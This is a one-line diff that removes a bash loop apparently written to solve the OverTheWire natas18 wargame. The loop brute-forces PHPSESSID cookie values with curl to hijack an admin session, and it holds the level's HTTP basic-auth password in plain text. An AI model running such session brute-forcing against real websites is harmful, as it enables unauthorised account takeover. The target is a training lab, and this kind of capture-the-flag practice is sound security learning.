@@ -1,1 +1,0 @@
-for i in {0..640}; do (curl -s -u natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP 'http://natas18.natas.labs.overthewire.org/index.php?debug=1&admin=1' --data 'username=admin&password=admin' --cookie "PHPSESSID=$i" >> natas18); done
